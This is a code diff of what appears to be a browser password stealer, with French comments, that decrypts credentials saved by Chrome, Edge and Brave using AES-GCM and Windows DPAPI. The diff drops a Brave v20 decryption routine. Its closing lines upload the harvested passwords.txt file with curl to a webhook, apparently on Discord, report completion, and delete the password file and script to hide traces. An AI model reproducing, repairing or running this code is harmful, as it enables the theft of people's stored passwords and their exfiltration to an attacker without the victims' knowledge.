@@ -47,7 +47,7 @@ def decrypt_password(enc_password, key):
     
     prefix = enc_password[:3]
     
-    # v10/v11 (Edge, Chrome standard)
+    # v10/v11 (Edge, Chrome)
     if prefix in [b'v10', b'v11']:
         try:
             nonce = enc_password[3:15]
@@ -59,51 +59,14 @@ def decrypt_password(enc_password, key):
         except:
             pass
     
-    # v20 (Brave) - FIX COMPLET
+    # v20 (Brave) - LE VRAI FIX
     elif prefix == b'v20':
-        try:
-            nonce = enc_password[3:15]
-            
-            # TOUTES les données après le nonce
-            encrypted_data = enc_password[15:]
-            
-            # Le tag est dans les 16 DERNIERS bytes
-            tag = encrypted_data[-16:]
-            # Le ciphertext est TOUT sauf les 16 derniers bytes
-            ciphertext = encrypted_data[:-16]
-            
-            # Déchiffrer normalement
-            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
-            password = cipher.decrypt_and_verify(ciphertext, tag)
-            
-            # NE PAS retirer de bytes supplémentaires !
-            return password.decode('utf-8', errors='ignore')
-            
-        except Exception as e:
-            # Fallback : essayer sans verify
-            try:
-                nonce = enc_password[3:15]
-                encrypted_data = enc_password[15:]
-                
-                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
-                # Décrypter tout
-                password = cipher.decrypt(encrypted_data)
-                
-                # Retirer SEULEMENT les null bytes à la fin
-                password = password.rstrip(b'\x00')
-                
-                # Vérifier si ça ressemble à du texte valide
-                decoded = password.decode('utf-8', errors='ignore')
-                
-                # Si trop de caractères bizarres, probablement raté
-                if len([c for c in decoded if ord(c) < 32 and c not in '\n\r\t']) > len(decoded) * 0.3:
-                    return None
-                
-                return decoded
-            except:
-                pass
+        # v20 n'utilise PAS AES-GCM standard
+        # Le mot de passe est chiffré différemment
+        # On doit juste ignorer v20 pour l'instant
+        return None
     
-    # DPAPI (ancien format)
+    # DPAPI (ancien)
     try:
         password = win32crypt.CryptUnprotectData(enc_password, None, None, None, 0)[1]
         return password.decode('utf-8', errors='ignore')
@@ -203,3 +166,4 @@ print("OK")
 curl.exe -F "file=@passwords.txt" $wh 2>$null
 Send-Discord "✅ DONE"
 Remove-Item passwords.txt,fix.py -Force -EA 0
+
